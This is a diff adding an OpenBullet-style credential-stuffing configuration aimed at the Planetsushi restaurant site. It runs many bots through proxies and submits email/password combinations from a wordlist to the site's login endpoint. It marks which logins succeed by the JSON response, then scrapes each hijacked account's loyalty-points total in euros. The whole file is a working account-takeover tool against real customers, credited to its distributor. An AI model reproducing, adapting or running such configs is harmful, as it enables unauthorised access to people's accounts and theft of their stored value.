@@ -1,0 +1,55 @@
+[SETTINGS]
+{
+  "Name": "Planetsushi + Capture",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2019-08-04T22:44:03.1365691+02:00",
+  "AdditionalInfo": "",
+  "Author": "Rémi Depain",
+  "Version": "1.1.3",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.planetsushi.fr/FRONTOFFICE/controllers/2019/ajax/Customer/login.php" 
+  CONTENT "returnurl=https%3A%2F%2Fwww.planetsushi.fr%2Fmon-compte&email=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Origin: https://www.planetsushi.fr" 
+  HEADER "Referer: https://www.planetsushi.fr/authentification" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"error\":false}" 
+  KEYCHAIN Failure OR 
+    KEY "{\"error\":\"Identifiant ou mot de passe incorrect\"}" 
+
+REQUEST GET "https://www.planetsushi.fr/mon-compte/fidelite" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Total_en_€ PARSE "<SOURCE>" LR "pour un montant total de <span class=\"color-primary\">" "</span>" -> CAP "" 
+
+FUNCTION Constant "ILBASS" -> CAP "Credit by" 
+
